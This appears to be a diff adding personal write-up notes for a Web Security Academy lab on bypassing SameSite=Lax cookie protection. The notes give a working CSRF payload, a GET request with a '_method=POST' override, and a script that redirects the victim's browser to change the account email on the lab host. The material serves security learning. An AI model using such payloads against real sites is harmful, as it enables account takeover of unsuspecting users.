@@ -1,0 +1,17 @@
+write up:
+    3 types : strict, lax, none
+    no csrf token in post/ change email
+    set-cookie in post login has no samesite => samesite = lax
+    convert post to get to bypass
+    and add _method=post => to convert get to post
+
+payload:
+    GET /my-account/change-email?email=23%40gmail.com&_method=POST
+
+
+
+deliver to victim:
+
+<script>
+document.location="https://0a8b00be04ea5963c0996e1b00dd00ec.web-security-academy.net/my-account/change-email?email=23%40gmail.com&_method=POST";
+</script>
